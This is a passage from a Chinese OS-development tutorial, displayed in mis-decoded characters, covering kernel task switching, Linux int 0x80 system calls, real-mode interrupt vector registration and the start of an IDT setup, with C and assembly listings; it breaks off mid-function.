EDIï¼‰ï¼Œè¿™ä¸ªç›¸å…³ä¿¡æ¯å°±æ˜¯ä»»åŠ¡ä¸Šä¸‹æ–‡ è°ƒåº¦å‡½æ•°å¯æœ‰ï¼š 123456void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125; é‚£ä¹ˆå¯¹äºæœ€å¼€å§‹çš„schedule.asmå°±æœ‰ï¼š æœ€å¼€å§‹çš„ä¿å­˜æ ˆä¿¡æ¯ å°† ebx esi edi å‹å…¥æ ˆä¿å­˜ å°†å½“å‰æ ˆé¡¶espè½¬åˆ°eaxä¸Šé¢ï¼Œå†å°†eax&amp;0xfffff000å¾—åˆ°ä¸‹ä¸€ä¸ªä»»åŠ¡çš„åœ°å€ï¼Œå†å°†å½“å‰æ ˆé¡¶è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªä»»åŠ¡åœ°å€ä¸­ å°†ä¼ å…¥çš„nextå€¼è½¬ç§»åˆ°eaxä¸­ä½œä¸ºè¿”å›å€¼ï¼Œå†å°†ä¸‹ä¸€ä¸ªä»»åŠ¡çš„åœ°å€è½¬åˆ°æ ˆé¡¶ä¸­ æœ€åå†popæ¢å¤æ ˆå¹³è¡¡ï¼Œè¿”å›åå°±å¯ä»¥åˆ°ä¸‹ä¸€ä¸ªä»»åŠ¡äº† src/include/xsys/task.h 123456789101112131415161718192021222324#ifndef XSYS_TASK_H#define XSYS_TASK_H#include &lt;xsys/types.h&gt;typedef u32 target_t();typedef struct task_t&#123; u32 *stack; // å†…æ ¸æ ˆ&#125; task_t;typedef struct task_frame_t&#123; u32 edi; u32 esi; u32 ebx; u32 ebp; void (*eip)(void);&#125; task_frame_t;void task_init();#endif src/kernel/task.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;xsys/task.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/debug.h&gt;#define PAGE_SIZE 0x1000task_t *a = (task_t *)0x1000;task_t *b = (task_t *)0x2000;extern void task_switch(task_t *next);task_t *running_task()&#123; asm volatile( &quot;movl %esp, %eax\\n&quot; &quot;andl $0xfffff000, %eax\\n&quot;);&#125;void schedule()&#123; task_t *current = running_task(); task_t *next = current == a ? b : a; task_switch(next);&#125;u32 thread_a()&#123; while (true) &#123; printk(&quot;A&quot;); schedule(); &#125;&#125;u32 thread_b()&#123; while (true) &#123; printk(&quot;B&quot;); schedule(); &#125;&#125;static void task_create(task_t *task, target_t target)&#123; u32 stack = (u32)task + PAGE_SIZE; stack -= sizeof(task_frame_t); task_frame_t *frame = (task_frame_t *)stack; frame-&gt;ebx = 0x11111111; frame-&gt;esi = 0x22222222; frame-&gt;edi = 0x33333333; frame-&gt;ebp = 0x44444444; frame-&gt;eip = (void *)target; task-&gt;stack = (u32 *)stack;&#125;void task_init()&#123; task_create(a, thread_a); task_create(b, thread_b); schedule();&#125; src/kernel/main.c 1234567891011121314151617181920#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/console.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/assert.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/task.h&gt;char message[] = &quot;HELLO XSYS\\n&quot;;char buf[1024];void kernel_init()&#123; console_init(); gdt_init(); task_init(); return;&#125; è°ƒè¯• æœ‰å¦‚ä¸‹ä¸¤ä¸ªæ–­ç‚¹ è¿™é‡Œçš„æ±‡ç¼–æˆ‘æ— æ³•å®šä½åˆ°å…·ä½“æ–‡ä»¶ï¼Œæ‰€ä»¥å¾—gdbçœ‹ä¸€ä¸‹äº† å¾—åˆ°current=0x1000 å†é€šè¿‡task_switchåˆ‡æ¢ å½“å‰ä»»åŠ¡ï¼ˆAï¼‰çš„å€¼è¢«å‹å…¥äº†æ ˆä¸­ï¼Œç„¶åå†æ¬¡å¾—åˆ°å½“å‰æ ˆçš„ä¿¡æ¯ï¼Œä¹‹åå°†espä¿¡æ¯ä¿å­˜åˆ°*eaxå³0x1000ä¸­ å†å°†ä¸‹ä¸€ä¸ªä»»åŠ¡çš„åœ°å€æ”¾å…¥åˆ°espä¸­ ç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ‡æ¢åˆ°ä»»åŠ¡Bçš„æ ˆ å°æ€»ç»“ ç›®å‰çš„å·¥ç¨‹æ–‡ä»¶æ ‘ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263joe1sn@ubuntu:~/Desktop/os2$ tree.â”œâ”€â”€ buildâ”‚ â”œâ”€â”€ bootâ”‚ â”‚ â”œâ”€â”€ boot.binâ”‚ â”‚ â””â”€â”€ loader.binâ”‚ â”œâ”€â”€ kernelâ”‚ â”‚ â”œâ”€â”€ assert.oâ”‚ â”‚ â”œâ”€â”€ console.oâ”‚ â”‚ â”œâ”€â”€ debug.oâ”‚ â”‚ â”œâ”€â”€ global.oâ”‚ â”‚ â”œâ”€â”€ io.oâ”‚ â”‚ â”œâ”€â”€ main.oâ”‚ â”‚ â”œâ”€â”€ printk.oâ”‚ â”‚ â”œâ”€â”€ schedule.oâ”‚ â”‚ â”œâ”€â”€ start.oâ”‚ â”‚ â””â”€â”€ task.oâ”‚ â”œâ”€â”€ kernel.binâ”‚ â”œâ”€â”€ libâ”‚ â”‚ â”œâ”€â”€ string.oâ”‚ â”‚ â””â”€â”€ vsprintf.oâ”‚ â”œâ”€â”€ master.imgâ”‚ â”œâ”€â”€ system.binâ”‚ â””â”€â”€ system.mapâ””â”€â”€ src â”œâ”€â”€ bochsrc â”œâ”€â”€ boot â”‚ â”œâ”€â”€ boot.asm â”‚ â””â”€â”€ loader.asm â”œâ”€â”€ include â”‚ â””â”€â”€ xsys â”‚ â”œâ”€â”€ assert.h â”‚ â”œâ”€â”€ console.h â”‚ â”œâ”€â”€ debug.h â”‚ â”œâ”€â”€ global.h â”‚ â”œâ”€â”€ io.h â”‚ â”œâ”€â”€ printk.h â”‚ â”œâ”€â”€ stdarg.h â”‚ â”œâ”€â”€ stdio.h â”‚ â”œâ”€â”€ string.h â”‚ â”œâ”€â”€ task.h â”‚ â”œâ”€â”€ types.h â”‚ â””â”€â”€ xsys.h â”œâ”€â”€ kernel â”‚ â”œâ”€â”€ assert.c â”‚ â”œâ”€â”€ console.c â”‚ â”œâ”€â”€ debug.c â”‚ â”œâ”€â”€ global.c â”‚ â”œâ”€â”€ io.asm â”‚ â”œâ”€â”€ main.c â”‚ â”œâ”€â”€ printk.c â”‚ â”œâ”€â”€ schedule.asm â”‚ â”œâ”€â”€ start.asm â”‚ â””â”€â”€ task.c â”œâ”€â”€ lib â”‚ â”œâ”€â”€ string.c â”‚ â””â”€â”€ vsprintf.c â”œâ”€â”€ makefile â””â”€â”€ tests â”œâ”€â”€ test â””â”€â”€ test.c11 directories, 48 files æ–‡ä»¶å¯åŠ¨æ–¹å¼ å¼•ç”¨ https://en.wikipedia.org/wiki/X86_calling_conventions#syscall https://github.com/StevenBaby/onix æ“ä½œç³»ç»Ÿå®ç°-ä¸­æ–­ä¸ç³»ç»Ÿè°ƒç”¨ ä½¿ç”¨Linuxçš„ç³»ç»Ÿè°ƒç”¨ ä»æ±‡ç¼–å‡ºå‘ï¼Œä¸€èˆ¬æ¥è¯´çš„ç¬¬ä¸€ä¸ªç¨‹åºæ˜¯hello_world 123456789101112131415[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 retsection .datamessage: db &quot;hello world&quot;,10,13,0 è¿™é‡Œä½¿ç”¨äº†linuxçš„int 0x80ç³»ç»Ÿè°ƒç”¨ï¼ˆè°ƒç”¨è¡¨ï¼šhttps://www.joe1sn.top/int80.html ï¼‰ï¼Œè°ƒç”¨çš„æ˜¯write %eax Name Source %ebx %ecx %edx %ecx %edi 1 sys_exit kernel/exit.c int - - - - 2 sys_fork arch/i386/kernel/process.c struct pt_regs - - - - 3 sys_read fs/read_write.c unsigned int char * size_t - - 4 sys_write fs/read_write.c unsigned int const char * size_t - - ebxæ˜¯é€‰æ‹©IOé€šé“ï¼ˆé‚£ä¸ªæµï¼‰ ecxæ˜¯å­—ç¬¦ä¸²çš„ç‰©ç†ä½ç½® edxæ˜¯è¦æ‰“å°çš„å­—ç¬¦ä¸ªæ•° eaxæ˜¯int 0x80è¦é€‰æ‹©çš„ç³»ç»Ÿè°ƒç”¨å· 1nasm -f elf32 hello_world.asm -o hello_world.o &amp;&amp; ld -m elf_i386 hello_world.o -o hello_world &amp;&amp; ./hello_world å› ä¸ºæˆ‘ä»¬ç›´è¿”å›åç¨‹åºæ²¡æœ‰é€€å‡ºçš„æŒ‡ä»¤ï¼Œæ‰€ä»¥å‡ºç°äº†æ®µé”™è¯¯ å†æ¬¡ä½¿ç”¨exitç³»ç»Ÿè°ƒç”¨å°±å¯ä»¥é¿å…è¿™ä¸ªé”™è¯¯äº† 12345678910111213141516[bits 32]section .textglobal _start_start: mov ebx, 0 mov ecx, message mov edx, 13 mov eax, 4 int 0x80 mov eax, 1 int 0x80section .datamessage: db &quot;hello world&quot;,10,13,0 å®ç°ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ ç³»ç»Ÿè°ƒç”¨æ˜¯åŸºäºä¸­æ–­å®ç°çš„ ä¸€ä¸ªæ™®éçš„æ€æƒ³å°±æ˜¯æ“ä½œç³»ç»Ÿæ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œå½“æ»¡è¶³ä¸€ä¸ªæ¡ä»¶æ—¶ï¼Œä¸­æ–­å¾ªç¯å»æ‰§è¡Œè§¦å‘çš„åŠŸèƒ½(å‡½æ•°)ï¼ˆwindowsçš„ç‚¹å‡»-&gt;æ‰“å¼€ä¸€ä¸ªçª—å£ï¼‰ï¼Œæ‰§è¡Œå®Œæˆè¿‡åå›åˆ°æ­»å¾ªç¯ã€‚ ä¿®æ”¹æˆ‘ä»¬çš„src/boot/boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0int 0x80 ;linuxç³»ç»Ÿè°ƒç”¨ invoke æ³¨å†Œcs:ip;ç¨‹åºæ‚¬åœjmp $interupt: mov si, string call print xchg bx,bx iret ;ä¸­æ–­è¿”å›;å®æ¨¡å¼çš„æ‰“å°print: mov ah, 0xe ;åŠŸèƒ½å‚æ•° .next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPUåœæ­¢ jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;å¡«å……times 510-($-$$) db 0db 0x55,0xaa è¿™é‡Œæ‰€æœ‰çš„ä¸€åˆ‡éƒ½æ˜¯å…ˆå…¥ä¸ºä¸»çš„è§‚å¿µï¼Œå› ä¸ºæˆ‘ä»¬å¹¶ä¸äº†è§£ä¸Šé¢hello_worldçš„åŸç†ï¼Œæˆ‘ä»¬åœ¨ä¸‹ä¸€èŠ‚ä»éªŒè¯ç°åœ¨äº†è§£çš„çŸ¥è¯† å…¶ä¸­æœ‰ï¼š 123456xchg bx,bxmov word [0x80 * 4], interruptmov word [0x80 * 4 + 2], 0xchg bx,bxint 0x80 ;linuxç³»ç»Ÿè°ƒç”¨ invoke æ³¨å†Œcs:ipxchg bx,bx æˆ‘ä»¬å°†0x80*4çš„ä½ç½®æ”¾å…¥äº†interruptçš„åœ°å€ï¼Œä¸‹ä¸ªæ–­ç‚¹çœ‹ä¸€ä¸‹ æˆ‘ä»¬æˆåŠŸçš„å°†interruptå‡½æ•°çš„åœ°å€æ”¾åˆ°äº†int 0x80è°ƒç”¨è¡¨çš„ç¬¬0ä¸ªä½ç½®ï¼Œå¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨int 0x70è°ƒç”¨ï¼Œå°±ç”¨ï¼š 123456xchg bx,bxmov word [0x70 * 4], interruptmov word [0x70 * 4 + 2], 0xchg bx,bxint 0x70 ;invoke æ³¨å†Œcs:ipxchg bx,bx æ•ˆæœæ˜¯ä¸€æ ·çš„ å†å¤ä¹ ä¸€ä¸‹ä¹‹å‰çš„çŸ¥è¯†ï¼šds=0æ—¶ï¼Œds:0x100 çš„ç‰©ç†åœ°å€æ˜¯0âˆ—010h+100h=100h0*010h+100h=100h0âˆ—010h+100h=100h æ¥ç€å®ç°é™¤0å¼‚å¸¸çš„ç³»ç»Ÿè°ƒç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[org 0x7c00];æœ€ç®€å•çš„ä¸»ç¨‹åºå¼•å¯¼ç¨‹åº;å®æ¨¡å¼çš„å¯åŠ¨åœ°å€;è®¾ç½®å±å¹•æ¨¡å¼ä¸ºæ–‡æœ¬æ¨¡å¼ï¼Œæ¸…é™¤å±å¹•mov ax,3int 0x10;åˆå§‹åŒ–æ®µå¯„å­˜å™¨mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; -------------------é™¤0å¼‚å¸¸mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx; -------------------;ç¨‹åºæ‚¬åœjmp $interrupt: mov si, string call print xchg bx,bx iret ;ä¸­æ–­è¿”å›;å®æ¨¡å¼çš„æ‰“å°print: mov ah, 0xe ;åŠŸèƒ½å‚æ•° .next: mov al, [si];å­—ç¬¦ cmp al, 0 ;åˆ¤æ–­æ˜¯å¦ä¸ºæœ€åä¸€ä¸ªç»“å°¾ jz .done ;ç»“å°¾è·³è½¬è‡³ret int 0x10 ;åŠŸèƒ½è°ƒç”¨ inc si ;åœ°å€-1 jmp .next ;ç»§ç»­ï¼Œä¸‹ä¸€ä¸ª .done: retstring: db &quot;.&quot;,0; \\n\\rerror: mov si, .msg call print hlt; CPUåœæ­¢ jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;å¡«å……times 510-($-$$) db 0db 0x55,0xaa 12345678mov word [0 * 4], interruptmov word [0 * 4 + 2], 0mov dx, 0mov ax, 1mov bx, 0xchg bx, bxdiv bx å…¶ä¸­å¯¹1ã€2è¡Œå®Œæˆäº†ä¸­æ–­å‡½æ•°çš„æ³¨å†Œï¼ˆè¦†ç›–äº†åŸå§‹çš„é™¤0å¼‚å¸¸å‡½æ•°ï¼‰ï¼Œæ¥ç€å°±æ˜¯ä¸€ä¸ªé™¤0å¼‚å¸¸ï¼Œæˆ‘ä»¬åœ¨interruptå‡½æ•°å¤„ä¸‹äº†æ–­ç‚¹ è¿™æ ·æ¯æ¬¡é™¤0å¼‚å¸¸éƒ½ä¼šè°ƒç”¨interruptå‡½æ•° ç§»é™¤æ‰€æœ‰æ–­ç‚¹ï¼Œç³»ç»Ÿå°±ä¸€ç›´æ­»å¾ªç¯è·‘ ç¨‹åºä¸€ç›´æ‰“å°.è¯´æ˜iretè¿”å›çš„åœ°å€å¹¶ä¸æ˜¯ä¸­æ–­å‘ç”Ÿæ—¶åçš„åœ°å€ï¼Œè€Œæ˜¯å¼•å‘å¼‚å¸¸ä»£ç å¼€å§‹çš„åœ°å€ï¼Œå³é™¤0æ“ä½œçš„åœ°å€ å¤§æ„æè¿°ä¸ºï¼šeip = &amp;div_0ï¼ŒåŒæ—¶æˆ‘ä»¬çš„æ“ä½œå¹¶æ²¡æœ‰ä¿®æ”¹ç›¸å…³å¯„å­˜å™¨çš„å€¼ï¼Œæ‰€ä»¥è¿™ä¸ªå¼‚å¸¸ä¼šè¢«ä¸€ç›´å¼•å‘ä¸‹å»ã€‚ ç›®å‰è¿™ä¸ªæ˜¯æˆ‘ä»¬è‡ªå·±æ³¨å†Œçš„ç³»ç»Ÿè°ƒç”¨ï¼Œä½ æ˜¯å¦æƒ³è¿‡æœ€å¼€å§‹int 0x10çš„BIOSç³»ç»Ÿè°ƒç”¨æ˜¯æ€ä¹ˆæ ·çš„ï¼Ÿ è¿™é‡Œæœ‰bochså®æ¨¡å¼ä¸‹çš„å†…å­˜å¸ƒå±€æƒ…å†µ èµ·å§‹åœ°å€ ç»“æŸåœ°å€ å¤§å° ç”¨é€” 0x000 0x3FF 1KB ä¸­æ–­å‘é‡è¡¨ 0x400 0x4FF 256B BIOS æ•°æ®åŒº 0x500 0x7BFF 29.75 KB å¯ç”¨åŒºåŸŸ 0x7C00 0x7DFF 512B MBR åŠ è½½åŒºåŸŸ 0x7E00 0x9FBFF 607.6KB å¯ç”¨åŒºåŸŸ 0x9FC00 0x9FFFF 1KB æ‰©å±• BIOS æ•°æ®åŒº 0xA0000 0xAFFFF 64KB ç”¨äºå½©è‰²æ˜¾ç¤ºé€‚é…å™¨ 0xB0000 0xB7FFF 32KB ç”¨äºé»‘ç™½æ˜¾ç¤ºé€‚é…å™¨ 0xB8000 0xBFFFF 32KB ç”¨äºæ–‡æœ¬æ˜¾ç¤ºé€‚é…å™¨ 0xC0000 0xC7FFF 32KB æ˜¾ç¤ºé€‚é…å™¨ BIOS 0xC8000 0xEFFFF 160KB æ˜ å°„å†…å­˜ 0xF0000 0xFFFEF 64KB-16B ç³»ç»Ÿ BIOS 0xFFFF0 0xFFFFF 16B ç³»ç»Ÿ BIOS å…¥å£åœ°å€ å†æ¬¡å›åˆ°Linuxç³»ç»Ÿè°ƒç”¨ è™½ç„¶æˆ‘çš„å†…æ ¸ç‰ˆæœ¬æ˜¯Linux ubuntu 5.4.0-100-generic #113~18.04.1-Ubuntuï¼Œä½†æ˜¯è¿™é‡Œç”¨v2.6.3çš„æºä»£ç è¯´æ˜åŸç† /arch/i386/kernel/entry.S 1234567891011121314151617181920212223ENTRY(system_call) pushl %eax # save orig_eax SAVE_ALL GET_THREAD_INFO(%ebp) cmpl $(nr_syscalls), %eax jae syscall_badsys # system call tracing in operation testb $_TIF_SYSCALL_TRACE,TI_FLAGS(%ebp) jnz syscall_trace_entrysyscall_call: call *sys_call_table(,%eax,4) movl %eax,EAX(%esp) # store the return valuesyscall_exit: cli # make sure we don&#x27;t miss an interrupt # setting need_resched or sigpending # between sampling and the iret movl TI_FLAGS(%ebp), %ecx testw $_TIF_ALLWORK_MASK, %cx # current-&gt;work jne syscall_exit_workrestore_all: RESTORE_ALL............ è¿™é‡Œå°±ä½“ç°äº†demoå·¥ç¨‹ä¸å®é™…å·¥ç¨‹çš„ä¸åŒ push eaxåˆ°æ ˆ ä¿å­˜ä¸€äº›ç›¸å…³çš„å€¼/arch/alpha/kernel/entry.S ä½¿ç”¨EBPæ¥ä¿å­˜å½“å‰çº¿ç¨‹çš„ä¿¡æ¯ æ ¹æ®EAXçš„å€¼é€‰æ‹©é€‚å½“çš„ç³»ç»Ÿè°ƒç”¨ /arch/um/kernel/sys_call_table.c 12345678910111213141516171819202122232425262728293031syscall_handler_t *sys_call_table[] = &#123; [ __NR_restart_syscall ] = sys_restart_syscall, [ __NR_exit ] = sys_exit, [ __NR_fork ] = sys_fork, [ __NR_read ] = (syscall_handler_t *) sys_read, [ __NR_write ] = (syscall_handler_t *) sys_write, /* These three are declared differently in asm/unistd.h */ [ __NR_open ] = (syscall_handler_t *) sys_open, [ __NR_close ] = (syscall_handler_t *) sys_close, [ __NR_waitpid ] = (syscall_handler_t *) sys_waitpid, [ __NR_creat ] = sys_creat, [ __NR_link ] = sys_link, [ __NR_unlink ] = sys_unlink, /* declared differently in kern_util.h */ [ __NR_execve ] = (syscall_handler_t *) sys_execve, [ __NR_chdir ] = sys_chdir, [ __NR_time ] = um_time, [ __NR_mknod ] = sys_mknod, [ __NR_chmod ] = sys_chmod, [ __NR_lchown ] = sys_lchown16, [ __NR_break ] = sys_ni_syscall, [ __NR_oldstat ] = sys_stat, [ __NR_lseek ] = (syscall_handler_t *) sys_lseek, [ __NR_getpid ] = sys_getpid, [ __NR_mount ] = um_mount, [ __NR_umount ] = sys_oldumount, [ __NR_setuid ] = sys_setuid16, ...... ...... è¿™é‡Œä»¥sys_writeä¸¾ä¾‹è¯´æ˜ /fs/read_write.c 1234567891011121314asmlinkage ssize_t sys_write(unsigned int fd, const char __user * buf, size_t count)&#123; struct file *file; ssize_t ret = -EBADF; int fput_needed; file = fget_light(fd, &amp;fput_needed); if (file) &#123; ret = vfs_write(file, buf, count, &amp;file-&gt;f_pos); fput_light(file, fput_needed); &#125; return ret;&#125; å…·ä½“é“¾æ¥æƒ…å†µ è¿™æ ·å°±å®ç°äº†ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ ä¸­æ–­æè¿°ç¬¦ å¼•å‘ä¸­æ–­çš„æ–¹å¼ å¤–ä¸­æ–­ å¼‚å¸¸ è½¯ä¸­æ–­ å¤–ä¸­æ–­å°±æ˜¯ç”±å¤–éƒ¨ä¸­æ–­æ§åˆ¶å™¨é€šçŸ¥ CPU éœ€è¦æ‰§è¡Œçš„ï¼ŒCPU åœ¨å½“å‰æŒ‡ä»¤æ‰§è¡Œå®Œæˆä¹‹åï¼Œå›å»æ£€æµ‹æ˜¯å¦æœ‰ä¸­æ–­äº§ç”Ÿï¼Œå¦‚æœæœ‰ï¼Œå¹¶ä¸” IF ä½æœ‰æ•ˆï¼Œä¹Ÿå°±æ˜¯å…è®¸ä¸­æ–­ï¼Œé‚£ä¹ˆå°±ä¼šæ‰§è¡Œä¸­æ–­å¤„ç†å‡½æ•°ï¼Œè¿™ç§æ–¹å¼ç›´æ¥çš„ä½“éªŒå°±æ˜¯ï¼ŒCPU å¯ä»¥åœ¨ä»»æ„ä¸¤ä¸ªæŒ‡ä»¤é—´æ’å…¥ä¸€ä¸ªä¸­æ–­å‡½æ•°è°ƒç”¨ï¼Œä¸­æ–­å‡½æ•°è°ƒç”¨ä¸æ™®é€šå‡½æ•°è°ƒç”¨ç¨æœ‰åŒºåˆ«ï¼Œåœ¨è°ƒç”¨æ—¶æ ˆä¸­å¤šå‹äº†ä¸€äº›æ•°æ®ï¼Œåœ¨ä¸­æ–­è¿”å›æ—¶ï¼Œä¼šå¼¹å‡ºï¼› å¼‚å¸¸å’Œè½¯ä¸­æ–­ç»Ÿç§°ä¸ºå†…ä¸­æ–­ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªä¸­æ–­æ—¶ CPU å’Œ è½¯ä»¶å†…éƒ¨äº§ç”Ÿçš„ï¼Œä¸å¤–éƒ¨ç¡¬ä»¶æ— å…³ï¼› å¼‚å¸¸æ˜¯ CPU åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œä¸ä¸‹å»äº†ï¼Œå¼•å‘çš„ä¸­æ–­è°ƒç”¨ï¼Œæ¯”å¦‚ é™¤é›¶å¼‚å¸¸ï¼Œç¼ºé¡µå¼‚å¸¸ï¼Œä¸€èˆ¬ä¿æŠ¤é”™è¯¯ï¼Œæœ‰ä¸€äº›å¼‚å¸¸åœ¨å¤„ç†åç¨‹åºæ˜¯å¯ä»¥ç»§ç»­æ‰§è¡Œçš„ï¼Œæ¯”å¦‚ç¼ºé¡µå¼‚å¸¸ï¼Œè€Œæœ‰ä¸€äº›å¼‚å¸¸å°±ä¸è¡Œäº†ï¼Œæ¯”å¦‚ä¸€èˆ¬ä¿æŠ¤ï¼Œè¿™ç§æƒ…å†µä¸‹ä¸€èˆ¬æ˜¯è½¯ä»¶è®¿é—®äº†ä¸è¯¥è®¿é—®çš„å†…å­˜æˆ–è€…å¯„å­˜å™¨ï¼Œè‡ªå·±æ²¡æœ‰æƒé™ï¼Œäºæ˜¯CPUä¼šè°ƒç”¨ä¸€èˆ¬ä¿æŠ¤å¼‚å¸¸å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸­ï¼Œä¸€èˆ¬ä¼šç»ˆæ­¢è¯¥è¿›ç¨‹çš„æ‰§è¡Œï¼Œè¯•å›¾è®¿é—®è‡ªå·±æ²¡æœ‰æƒé™çš„å†…å®¹ï¼Œåº”è¯¥æ˜¯å±é™©çš„ç¨‹åºï¼Œå¯èƒ½æ˜¯æ¶æ„ç¨‹åºï¼Œæˆ–è€…æ˜¯ç¨‹åºæœ‰æ¼æ´ï¼› è½¯ä¸­æ–­ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯åº”ç”¨ç¨‹åºå’Œæ“ä½œç³»ç»Ÿæ²Ÿé€šçš„ä¸€ç§æ–¹å¼ï¼Œåº”ç”¨ç¨‹åºè¿è¡Œåœ¨è¾ƒä½çš„ç‰¹æƒçº§ï¼Œä¸€èˆ¬æ¥è¯´æ²¡æœ‰ç›´æ¥è®¿é—®ç¡¬ä»¶çš„æƒé™ï¼Œå½“åº”ç”¨ç¨‹åºæƒ³è¦è®¿é—®ç¡¬ä»¶çš„æ—¶å€™ï¼Œæ¯”å¦‚å…¸å‹çš„è¯»å†™æ–‡ä»¶ï¼Œå°±éœ€è¦è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿè°ƒç”¨å°±æ˜¯ç”¨è½¯ä¸­æ–­å®ç°çš„ï¼Œä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºè°ƒç”¨è½¯ä¸­æ–­å‡½æ•°æ¥è¯·æ±‚æ“ä½œç³»ç»Ÿï¼Œä»¥è®¿é—®ç¡¬ä»¶ï¼Œè®¿é—®ç¡¬ä»¶çš„å‡½æ•°æ˜¯æ“ä½œç³»ç»Ÿå®ç°çš„ï¼Œäºæ˜¯è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå°±è¿™æ ·ã€‚ ä»Linuxæºä»£ç æ¥çœ‹ï¼Œå½“æˆ‘ä»¬éœ€è¦å®ç°è®¸å¤šç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œå¯ä»¥æŠŠæ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„åœ°å€å†™åˆ°ä¸€å¼ å‡½æ•°è¡¨ä¸Šï¼Œå®ç°ä¸€ä¸ªå’Œlinuxå·®ä¸å¤šçš„ç³»ç»Ÿè°ƒç”¨è¡¨ å¯¹äºæ¯ä¸€ä¸ªä¸­æ–­ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªä¸­æ–­æè¿°ç¬¦è¡¨(interrupte descriptor table. IDT) åœ¨/arch/i386/boot/setup.Såˆå§‹åŒ–äº†å…¨å±€æè¿°ç¬¦å’Œä¸­æ–­æè¿°ç¬¦ 123456789101112131415161718192021222324252627#endif /* CONFIG_X86_VOYAGER */# set up gdt and idt lidt idt_48 # load idt with 0,0 xorl %eax, %eax # Compute gdt_base movw %ds, %ax # (Convert %ds:gdt to a linear ptr) shll $4, %eax addl $gdt, %eax movl %eax, (gdt_48+2) lgdt gdt_48 # load gdt with whatever is # appropriate# make sure any possible coprocessor is properly reset.. xorw %ax, %ax outb %al, $0xf0 call delay outb %al, $0xf1 call delay# well, that went ok, I hope. Now we mask all interrupts - the rest# is done in init_IRQ(). movb $0xFF, %al # mask all interrupts for now outb %al, $0xA1 call delay movb $0xFB, %al # mask all irq&#x27;s but irq2 which outb %al, $0x21 # is cascaded lgdtï¼šåŠ è½½å…¨å±€æè¿°ç¬¦ lidtï¼šåŠ è½½ä¸­æ–­æè¿°ç¬¦ ä¸­æ–­æè¿°ç¬¦ç»“æ„ä½“ /arch/x86/kernel/idt.c 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); è‡³äºæœ€ä¸‹é¢çš„offset_highå’Œreservedéƒ½æ˜¯ç•™ç»™x86_64çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å®šä¹‰å¦‚ä¸‹ç»“æ„ä½“ src/include/xsys/interrupt.h 12345678910111213141516171819202122#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // æ®µå†…åç§» 0 ~ 15 ä½ u16 selector; // ä»£ç æ®µé€‰æ‹©å­ u8 reserved; // ä¿ç•™ä¸ç”¨ u8 type : 4; // ä»»åŠ¡é—¨/ä¸­æ–­é—¨/é™·é˜±é—¨ u8 segment : 1; // segment = 0 è¡¨ç¤ºç³»ç»Ÿæ®µ u8 DPL : 2; // ä½¿ç”¨ int æŒ‡ä»¤è®¿é—®çš„æœ€ä½æƒé™ u8 present : 1; // æ˜¯å¦æœ‰æ•ˆ u16 offset1; // æ®µå†…åç§» 16 ~ 31 ä½&#125; _packed gate_t;void interrupt_init();#endif ä¹‹åå°±æ˜¯åˆå§‹åŒ–idt src/kernel/interrupt.c 12345678910111213141516171819202122void interrupt_init()&#123; for (size_t i = 0; i &lt; IDT_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; gate-&gt;offset0 = (u32)interrupt_handler &amp; 0xffff; gate-&gt;offset1 = ((u32)interrupt_handler 